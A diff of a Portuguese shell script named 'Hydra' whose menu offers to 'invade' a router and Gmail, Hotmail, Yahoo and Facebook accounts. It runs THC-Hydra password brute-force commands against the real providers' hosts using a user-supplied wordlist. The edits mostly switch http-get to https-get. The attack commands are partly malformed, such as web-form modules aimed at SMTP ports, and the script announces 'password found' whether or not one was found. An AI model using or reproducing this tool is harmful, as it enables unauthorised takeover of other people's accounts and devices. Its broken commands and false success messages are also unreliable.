@@ -17,12 +17,11 @@ figlet Hydra
 #
 #MENU
 echo "======================================"
-echo "=   \033[1;33m[\033[1;31m1]>> \033[1;33mINVADIR ROTEADOR \033[1;36m"
-echo "=   \033[1;33m[\033[1;31m2]>> \033[1;33mINVADIR GMAIL \033[1;36m"
-echo "=   \033[1;33m[\033[1;31m3]>> \033[1;33mINVADIR HOTMAIL \033[1;36m"
-echo "=   \033[1;33m[\033[1;31m4]>> \033[1;33mINVADIR YAHOOL \033[1;36m"
-echo "=   \033[1;33m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
-echo "======================================"
+echo "   \033[1;33m[\033[1;31m1]>> \033[1;33mINVADIR ROTEADOR \033[1;36m"
+echo "   \033[1;33m[\033[1;31m2]>> \033[1;33mINVADIR GMAIL \033[1;36m"
+echo "   \033[1;33m[\033[1;31m3]>> \033[1;33mINVADIR HOTMAIL \033[1;36m"
+echo "   \033[1;33m[\033[1;31m4]>> \033[1;33mINVADIR YAHOOL \033[1;36m"
+echo "   \033[1;33m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
 echo
 #
 #Escolher entre 1,2,3,4 ou 5
@@ -42,7 +41,6 @@ read -p "[+]=>" wordlist
 echo 
  echo "\033[1;31mINVADINDO ROTEADOR..."; sleep 2
 hydra -l $user -P $wordlist -V $ip http-get
-echo "\033[1;31mSENHA ENCONTRADA!"; sleep 2
 fi
 #Invadir Gmail
 if [ "$opcao" = "2" ];then
@@ -54,8 +52,8 @@ echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
 read -p "[+]>>" lista
 echo
  echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
-hydra -l $email -P $lista -s 465 smtp.gmail.com http-get
-echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
+hydra -l $email -P $lista -s 465 smtp.gmail.com https-get
+echo "\033[1;31mSENHA ENCONTRADA!"; sleep 2
 fi
 #Invadir HOTMAIL
 if [ "$opcao" = "3" ];then
@@ -68,7 +66,7 @@ sleep 2
 read -p "[+]>>" lista
 echo
  echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
-hydra -l $email -P $lista -s 587 smtp.live.com http-get
+hydra -l $email -P $lista -s 587 smtp.live.com https-get
 echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
 fi
 #Invadir YAHOO
@@ -82,7 +80,7 @@ sleep 2
 read -p "[+]>>" lista
 echo
  echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
-hydra -l $email -P $lista -s 465 smtp.mail.yahoo.com http-get
+hydra -l $email -P $lista -s 465 smtp.mail.yahoo.com https-get
 echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
 fi
 #Invadir FACEBOOK
@@ -96,7 +94,7 @@ sleep 2
 read -p "[+]>>" lista
 echo
  echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
-hydra -l $email -P $lista -f www.facebook.com http-get
+hydra -l $email -P $lista -f www.facebook.com https-get
 echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
 fi
 #
@@ -106,3 +104,4 @@ sleep 4
 #Saindo do Script
 
 exit
+
